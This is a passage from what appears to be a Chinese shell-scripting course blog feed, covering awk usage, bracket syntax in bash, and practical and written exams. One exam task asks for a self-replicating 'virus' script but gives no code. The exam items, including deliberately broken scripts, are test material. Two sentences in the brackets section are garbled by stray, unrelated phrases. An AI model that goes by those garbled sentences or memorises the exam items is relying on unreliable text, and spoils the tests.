控制记录分隔符</span><br></pre></td></tr></table></figure><p>此外,$0变量是指整条记录。$1表示当前行的第一个域,$2表示当前行的第二个域,……以此类推。</p><p>统计/etc/passwd:文件名，每行的行号，每行的列数，对应的完整行内容:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk  -F <span class="string">':'</span>  <span class="string">'&#123;print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0&#125;'</span> /etc/passwd</span></span><br><span class="line">filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/bash</span><br><span class="line">filename:/etc/passwd,linenumber:2,columns:7,linecontent:daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:3,columns:7,linecontent:bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:4,columns:7,linecontent:sys:x:3:3:sys:/dev:/bin/sh</span><br></pre></td></tr></table></figure><p>使用printf替代print,可以让代码更加简洁，易读</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk  -F ':'  '&#123;printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)&#125;' /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="print和printf"><a href="#print和printf" class="headerlink" title="print和printf"></a>print和printf</h3><p>awk中同时提供了print和printf两种打印输出的函数。</p><p>其中print函数的参数可以是变量、数值或者字符串。字符串必须用双引号引用，参数用逗号分隔。如果没有逗号，参数就串联在一起而无法区分。这里，逗号的作用与输出文件的分隔符的作用是一样的，只是后者是空格而已。</p><p>printf函数，其用法和c语言中printf基本相似,可以格式化字符串,输出复杂时，printf更加好用，代码更易懂。</p><h3 id="awk编程"><a href="#awk编程" class="headerlink" title="awk编程"></a>awk编程</h3><h4 id="变量和赋值"><a href="#变量和赋值" class="headerlink" title="变量和赋值"></a>变量和赋值</h4><p>除了awk的内置变量，awk还可以自定义变量。</p><p>下面统计/etc/passwd的账户人数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;count++;print $0;&#125; END&#123;print "user count is ", count&#125;' /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">......</span><br><span class="line">user count is  40</span><br></pre></td></tr></table></figure><p>count是自定义变量。之前的action{}里都是只有一个print,其实print只是一个语句，而action{}可以有多个语句，以;号隔开。</p><p>这里没有初始化count，虽然默认是0，但是妥当的做法还是初始化为0:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">awk 'BEGIN &#123;count=0;print "[start]user count is ", count&#125; &#123;count=count+1;print $0;&#125; END&#123;print "[end]user count is ", count&#125;' /etc/passwd</span><br><span class="line">[start]user count is  0</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">[end]user count is  40</span><br></pre></td></tr></table></figure><p>统计某个文件夹下的文件占用的字节数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size&#125;'</span><br><span class="line">[end]size is  8657198</span><br></pre></td></tr></table></figure><p>如果以M为单位显示:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.25889 M</span><br></pre></td></tr></table></figure><p>注意，统计不包括文件夹的子目录。</p><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>awk中的条件语句是从C语言中借鉴来的，见如下声明方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">    statement;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; else if (expression1) &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>统计某个文件夹下的文件占用的字节数,过滤4096大小的文件(一般都是文件夹):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;print "[start]size is ", size&#125; &#123;if($5!=4096)&#123;size=size+$5;&#125;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.22339 M</span><br></pre></td></tr></table></figure><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><p>awk中的循环语句同样借鉴于C语言，支持while、do/while、for、break、continue，这些关键字的语义和C语言中的语义完全相同。</p><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>因为awk中数组的下标可以是数字和字母，数组的下标通常被称为关键字(key)。值和关键字都存储在内部的一张针对key/value应用hash的表格里。由于hash不是顺序存储，因此在显示数组内容时会发现，它们并不是按照你预料的顺序显示出来的。数组和变量一样，都是在使用时自动创建的，awk也同样会自动判断其存储的是数字还是字符串。一般而言，awk中的数组用来从记录中收集信息，可以用于计算总和、统计单词以及跟踪模板被匹配的次数等等。</p><p>显示/etc/passwd的账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">awk -F ':' 'BEGIN &#123;count=0;&#125; &#123;name[count] = $1;count++;&#125;; END&#123;for (i = 0; i &lt; NR; i++) print i, name[i]&#125;' /etc/passwd</span><br><span class="line">0 root</span><br><span class="line">1 daemon</span><br><span class="line">2 bin</span><br><span class="line">3 sys</span><br><span class="line">4 sync</span><br><span class="line">5 games</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里使用for循环遍历数组</p><p>awk编程的内容极多，这里只罗列简单常用的用法，更多请参考 <a href="http://www.gnu.org/software/gawk/manual/gawk.html" target="_blank" rel="noopener">http://www.gnu.org/software/gawk/manual/gawk.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sed&quot;&gt;&lt;a href=&quot;#sed&quot; class=&quot;headerlink&quot; title=&quot;sed&quot;&gt;&lt;/a&gt;sed&lt;/h2&gt;&lt;h3 id=&quot;什么是sed&quot;&gt;&lt;a href=&quot;#什么是sed&quot; class=&quot;headerlink&quot; title=&quot;什么是sed&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第六课 上机考试</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E4%B8%8A%E6%9C%BA/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.753Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>请将脚本保存，存放路径为/home/kiosk/Desktop/stux/,其中x为你的机号<br>test.sh num.sh checkip.sh dns.sh useradd.sh 每题20分</p></blockquote><h2 id="1-流程控制语句应用测试："><a href="#1-流程控制语句应用测试：" class="headerlink" title="1.流程控制语句应用测试："></a>1.流程控制语句应用测试：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编写一个脚本，脚本名为test.sh</span><br><span class="line">判断&#x2F;tmp&#x2F;test1至&#x2F;tmp&#x2F;test50和&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;hosts文件存在不存在，若不存在则将该文件创建出来。</span><br></pre></td></tr></table></figure><h2 id="2-按照运行结果编写Shell脚本："><a href="#2-按照运行结果编写Shell脚本：" class="headerlink" title="2.按照运行结果编写Shell脚本："></a>2.按照运行结果编写Shell脚本：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">要求：1）脚本名为num.sh</span><br><span class="line">      2）要求显示结果如下：</span><br><span class="line"> 第一行0，第二行01，第三行012，以此类推，输出如上0到9的结果即可。</span><br><span class="line">0</span><br><span class="line">01</span><br><span class="line">012</span><br><span class="line">0123</span><br><span class="line">01234</span><br><span class="line">012345</span><br><span class="line">0123456</span><br><span class="line">01234567</span><br><span class="line">012345678</span><br><span class="line">0123456789</span><br></pre></td></tr></table></figure><h3 id="3-正则表达式应用测试："><a href="#3-正则表达式应用测试：" class="headerlink" title="3.正则表达式应用测试："></a>3.正则表达式应用测试：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">编写一个IP检测脚本</span><br><span class="line">1） 脚本名为checkip.sh</span><br><span class="line">2） 输入参数为$1，$1 为要判断的输入，如果$1 为ip 地址，则输出”This is ip address”,</span><br><span class="line">如果$1 为非ip 地址，则输出”This is not ip address”</span><br><span class="line">3） 执行方法为checkip.sh 192.168.1.1</span><br><span class="line">4） 测试如下输入值</span><br><span class="line">192.168.0.199  192.a.12.0  24.235.299.1  192.168.3</span><br></pre></td></tr></table></figure><h3 id="4-实际应用测试1"><a href="#4-实际应用测试1" class="headerlink" title="4.实际应用测试1"></a>4.实际应用测试1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编写一个脚本，脚本名为dns.sh,通过脚本搭建dns。</span><br><span class="line">要求：解析uplooking.com域名</span><br><span class="line">A记录有www.uplooking.com 10.2.2.2</span><br><span class="line">PTR记录有相应的反向解析</span><br></pre></td></tr></table></figure><h3 id="5-实际应用测试2"><a href="#5-实际应用测试2" class="headerlink" title="5.实际应用测试2"></a>5.实际应用测试2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编写一个脚本，脚本名为useradd.sh</span><br><span class="line">要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。</span><br><span class="line">[root@rhel6 ~]# cat &#x2F;tmp&#x2F;useraddlist1</span><br><span class="line">dabao 888 xuexi,it uplooking</span><br><span class="line">lucy 889 sales,it uplooking</span><br><span class="line">lily 899 pro,aa uplooking</span><br></pre></td></tr></table></figure><h3 id="6-病毒自我复制脚本"><a href="#6-病毒自我复制脚本" class="headerlink" title="6.病毒自我复制脚本"></a>6.病毒自我复制脚本</h3><h3 id="7-获取apache访问日志中访问次数最多的前5个ip地址"><a href="#7-获取apache访问日志中访问次数最多的前5个ip地址" class="headerlink" title="7.获取apache访问日志中访问次数最多的前5个ip地址"></a>7.获取apache访问日志中访问次数最多的前5个ip地址</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;请将脚本保存，存放路径为/home/kiosk/Desktop/stux/,其中x为你的机号&lt;br&gt;test.sh num.sh checkip.sh dns.sh useradd.sh 每题20分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第七课 笔试</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/shell%E7%AC%94%E8%AF%95/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一：纠错题：请找出以下代码有错误的地方并更正。（3-20）"><a href="#一：纠错题：请找出以下代码有错误的地方并更正。（3-20）" class="headerlink" title="一：纠错题：请找出以下代码有错误的地方并更正。（3*20）"></a>一：纠错题：请找出以下代码有错误的地方并更正。（3*20）</h2><h3 id="1-两个数字相加"><a href="#1-两个数字相加" class="headerlink" title="1. 两个数字相加"></a>1. 两个数字相加</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin.bash</span></span><br><span class="line">read -p "input number1" : num1</span><br><span class="line">read -p "input number2" : num2</span><br><span class="line">echo $(num1+num2)</span><br></pre></td></tr></table></figure><p>请将更正脚本保存，名为1.sh，存放路径为/home/kiosk/Desktop/stux/1.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p><h3 id="2-将开机selinux状态设置为disabled"><a href="#2-将开机selinux状态设置为disabled" class="headerlink" title="2. 将开机selinux状态设置为disabled"></a>2. 将开机selinux状态设置为disabled</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">sed 'SELINUXs/disabled/enforcing/' /etc/selinux/config</span><br></pre></td></tr></table></figure><p>请将更正脚本保存，名为2.sh，存放路径为/home/kiosk/Desktop/stux/2.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p><h3 id="3-判断100以内被5整除但是不能被7整除的数字"><a href="#3-判断100以内被5整除但是不能被7整除的数字" class="headerlink" title="3. 判断100以内被5整除但是不能被7整除的数字"></a>3. 判断100以内被5整除但是不能被7整除的数字</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in (seq 1 100)</span><br><span class="line">A=$(($i % 5))</span><br><span class="line">B=$(($i%7))</span><br><span class="line">if [ $A -eq 0 ] -a [ $B -ne 0 ]</span><br><span class="line">then</span><br><span class="line">echo $i</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>请将更正脚本保存，名为3.sh，存放路径为/home/kiosk/Desktop/stux/3.sh ,其中x为你的机号<br>;在脚本中用#注释出题目中错误的地方</p><h2 id="二：填空题（2-10）"><a href="#二：填空题（2-10）" class="headerlink" title="二：填空题（2*10）"></a>二：填空题（2*10）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 通过什么符号计算传递进来的位置参数？__________</span><br><span class="line">2. 如何检查之前的命令是否运行成功？__________</span><br><span class="line">3. 如何获取一个文件每一行以空格为分隔的第三个元素？__________</span><br><span class="line">4. 调试bash脚本的参数为？__________</span><br><span class="line">5.    A&#x3D;a:b:c:d    echo $&#123;A&#x2F;&#x2F;:&#x2F;&#125;     结果是__________</span><br><span class="line">6. awk的NR变量作用是什么？___________________</span><br><span class="line">7. 如何获取数组的长度?   ____________</span><br><span class="line">8. 如何引用传递给脚本的第十个位置参数？_______________</span><br><span class="line">9. $$的含义？_____________________</span><br><span class="line">10. 命令 “export” 有什么用？ ____________________________</span><br></pre></td></tr></table></figure><h2 id="三：选择题（2-10）"><a href="#三：选择题（2-10）" class="headerlink" title="三：选择题（2*10）"></a>三：选择题（2*10）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1. Awk里的内置变量NF指的是（    ）</span><br><span class="line">A）  所有输入文件记录的行数         B） 单个输入文件记录的行数</span><br><span class="line">C） 以指定分隔符号作为分隔的列数   D） AWK处理文件的个数</span><br><span class="line"></span><br><span class="line">2. 跳出当前循环，进入下一个循环使用的语句是（   ）</span><br><span class="line">A） continueB）break     C）exit    D）return</span><br><span class="line"></span><br><span class="line">3. 使用正则表达式的语句sed -n &#39;&#x2F;^\&lt;[^0-9a-d]*\&gt;$&#x2F;p&#39; &#x2F;tmp&#x2F;list输出的可能是以下哪个（   ）</span><br><span class="line">A）kevin alice     B）selena</span><br><span class="line">C）peter         D）23naive</span><br><span class="line"></span><br><span class="line">4. 以下哪个选项关于数组赋值是错误的（    ）</span><br><span class="line">A） A[1]&#x3D;3       B）A&#x3D;([15]&#x3D;1 a d e)</span><br><span class="line">C）A&#x3D;((6 7 0 2))   D）A&#x3D;(15 3 47 a)</span><br><span class="line"></span><br><span class="line">5. 以下哪个表达式可以算出8+3的结果（    ）</span><br><span class="line">A） echo $((8+3))</span><br><span class="line">B） echo $(8+3)</span><br><span class="line">C） echo $&#123;8+3&#125;</span><br><span class="line">D） echo $[[8+3]]</span><br><span class="line"></span><br><span class="line">6. 以下哪个流程语句是判断为真则做循环（    ）</span><br><span class="line">A） until   B）while</span><br><span class="line">C）case   D）for</span><br><span class="line">7. 阅读以下代码，该代码输出结果是（    ）</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">i&#x3D;0</span><br><span class="line">sum&#x3D;0</span><br><span class="line">while [ $i -le 5 ]</span><br><span class="line">do</span><br><span class="line">        sum&#x3D;$(($sum+$i))</span><br><span class="line">        i&#x3D;$(($i+1))</span><br><span class="line">done</span><br><span class="line">        echo $sum</span><br><span class="line">A）10    B）21    C）15     D）该代码执行会产生死循环</span><br><span class="line"></span><br><span class="line">8. 函数内如何设置局部变量（    ）</span><br><span class="line">A） local    B）export</span><br><span class="line">C）source  D）function</span><br><span class="line"></span><br><span class="line">9. 以下哪一种指令显示的结果为$test（   ）</span><br><span class="line">A）\echo $test      B）echo &quot;$test&quot;</span><br><span class="line">C）echo &#39;$test&#39;      D）echo &quot;$&#123;test&#125;&quot;</span><br><span class="line"></span><br><span class="line">10. shift的作用是（    ）</span><br><span class="line">A） 定义返回值     B）移动位置参数</span><br><span class="line">C）跳出脚本    D）跳出循环</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一：纠错题：请找出以下代码有错误的地方并更正。（3-20）&quot;&gt;&lt;a href=&quot;#一：纠错题：请找出以下代码有错误的地方并更正。（3-20）&quot; class=&quot;headerlink&quot; title=&quot;一：纠错题：请找出以下代码有错误的地方并更正。（3*20）&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第五课 各种括号的作用</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.755Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、小括号-圆括号"><a href="#一、小括号-圆括号" class="headerlink" title="一、小括号,圆括号()"></a>一、小括号,圆括号()</h3><h4 id="1、单小括号"><a href="#1、单小括号" class="headerlink" title="1、单小括号 ()"></a>1、单小括号 ()</h4><p>1 命令组。括号中的命令将会新开一个子shell顺序执行,所以括号中的变量不能够被脚本余下的部分使用。括号中多个命令之间用分号隔开,最后一个命令可以没有分号,各命令和括号之间不必有空格。</p><p>2 命令替换。等同于<code>cmd</code>,shell扫描一遍命令行,发现了$(cmd)结构,便将$(cmd)中的cmd执行一次,得到其标准输出,再将此输出放到原来命令。有些shell不支持,如tcsh。</p><p>3 用于初始化数组。如:array=(a b c d)</p><h4 id="2、双小括号"><a href="#2、双小括号" class="headerlink" title="2、双小括号 (( ))"></a>2、双小括号 (( ))</h4><p>1 整数扩展。这种扩展计算是整数型的计算,不支持浮点型。((exp))结构扩展并计算一个算术表达式的值,如果表达式的结果为0,那么返回的退出状态码为1,或者 是”假”,而一个非零值的表达式所返回的退出状态码将为0,或者是”true”。若是逻辑判断,表达式exp为真则为1,假则为0。</p><p>2 只要括号中的运算符、表达式符合C语言运算规则,都可用在$((exp))中,甚至是三目运算符。作不同进位(如二进制、八进制、十六进制)运算时,输出结果全都自动转化成了十进制。如:echo $((16#5f)) 结果为95(16进位转十进制)</p><p>3 单纯用 (( )) 也可重定义变量值,比如 a=5; ((a++)) 可将 $a 重定义为6</p><p>4 常用于算术运算比较,双括号中的变量可以不使用$符号前缀。括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则,比如可以直接使用for((i=0;i&lt;5;i++)), 如果不使用双括号, 则为for i in <code>seq 04</code>或者for i in {0..4}。再如可以直接使用if (($i&lt;5)), 如果不使用双括号, 则为if [ $i -lt 5 ]。</p><h3 id="二、中括号-方括号"><a href="#二、中括号-方括号" class="headerlink" title="二、中括号,方括号[]"></a>二、中括号,方括号[]</h3><h4 id="1、单中括号"><a href="#1、单中括号" class="headerlink" title="1、单中括号 []"></a>1、单中括号 []</h4><p>1 bash 的内部命令,[和test是等同的。如果我们不用绝对路径指明,通常我们用的都是bash自带的命令。if/test结构中的左中括号是调用test的命令标识,右中括号是关闭条件判断的。这个命令把它的参数作为比较表达式或者作为文件测试,并且根据比较的结果来返回一个退出状态码。if/test结构中并不是必须右中括号,但是新版的Bash中要求必须这样。</p><p>2 Test和[]中可用的比较运算符只有==和!=,两者都是用于字符串比较的,不可用于整数比较,整数比较只能使用-eq,-gt这种形式。无论是字符串比较还是整数比较都不支持大于号小于号。如果实在想用,对于字符串比较可以使用转义形式,如果比较”ab”和”bc”:[ ab &lt; bc ],结果为真,也就是返回状态为0。[ ]中的逻辑与和逻辑或使用-a 和-o 表示。</p><p>3 字符范围。用作正则表达式的一部分,描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。</p><p>4 在一个array 结构的上下文中,中括号用来引用数组中每个元素的编号。</p><h4 id="2、双中括号"><a href="#2、双中括号" class="headerlink" title="2、双中括号[[ ]]"></a>2、双中括号[[ ]]</h4><p>1 [[是 bash 程序语言的关键字。并不是一个命令,[[ ]] 结构比[ ]结构更加通用。在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割,但是会发生参数扩展和命令替换。</p><p>2 支持字符串的模式匹配,使用=~操作符时甚至支持shell的正则表达式。字符串比较时可以把右边的作为一shell中各种括号的作用()、个模式,而不仅仅是一个字符串,比如[[ hello == hell? ]],结果为真。[[ ]] 中匹配字符串或通配符,不需要引号。</p><p>3 使用[[ … ]]条件判断结构,而不是[ … ],能够防止脚本中的许多逻辑错误。比如,&amp;&amp;、||、&lt;和&gt; 操作符能linux shell下除了某个文件外的其他文件全部删除够正常存在于[[ ]]条件判断结构中,但是如果出现在[ ]结构中的话,会报错。比如可以直接使用if [[ $a != 1 &amp;&amp;$a != 2 ]], 如果不适用双括号, 则为if [ $a -ne 1] &amp;&amp; [ $a != 2 ]或者if [ $a -ne 1 -a $a != 2 ]。</p><p>4 bash把双中括号中的表达式看作一个单独的元素,并返回一个退出状态码。</p><h3 id="三、大括号、花括号"><a href="#三、大括号、花括号" class="headerlink" title="三、大括号、花括号 {}"></a>三、大括号、花括号 {}</h3><h4 id="1、常规用法"><a href="#1、常规用法" class="headerlink" title="1、常规用法"></a>1、常规用法</h4><p>1 大括号拓展。(通配(globbing))将对大括号中的文件名做扩展。在大括号中,不允许有空白,除非这个空白被引用或转义。第一种:对大括号中的以逗号分割的文件列表进行拓展。如 touch {a,b}.txt 结果为a.txt b.txt。第二种:对大括号中以点点(..)分割的顺序文件列表起拓展作用,如:touch {a..d}.txt 结果为a.txt b.txt c.txtd.txt</p><p>2 代码块,又被称为内部组,这个结构事实上创建了一个匿名函数 。与小括号中的命令不同,大括号内的命令不会新开一个子shell运行,即脚本余下部分仍可使用括号内变量。括号内的命令间用分号隔开,最后一个也必须有分号。{}的第一个命令和左括号之间必须要有一个空格</p><h4 id="2、几种特殊的替换结构"><a href="#2、几种特殊的替换结构" class="headerlink" title="2、几种特殊的替换结构"></a>2、几种特殊的替换结构</h4><p>${var:-string},${var:+string},${var:=string},${var:?string}</p><p>1 ${var:-string}和${var:=string}:若变量var为空,则用在命令行中用string来替换${var:-string},否则变量var不为空时,则用变量var的值来替换${var:-string};对于${var:=string}的替换规则和${var:-string}是一样的,所不同之处是${var:=string}若var为空时,用string替换${var:=string}的同时,把string赋给变量var:${var:=string}很常用的一种用法是,判断某个变量是否赋值,没有的话则给它赋上一个默认值。</p><p>2 ${var:+string}的替换规则和上面的相反,即只有当var不是空的时候才替换成string,若var为空时则不替换或者说是替换成变量 var的值,即空值。(因为变量var此时为空,所以这两种说法是等价的)</p><p>3 ${var:?string}替换规则为:若变量var不为空,则用变量var的值来替换${var:?string};若变量var为空,则把string输出到标准错误中,并从脚本中退出。我们可利用此特性来检查是否设置了变量的值。</p><p>补充扩展:在上面这五种替换结构中string不一定是常值的,可用另外一个变量的值或是一种命令的输出。</p><h4 id="3、四种模式匹配替换结构"><a 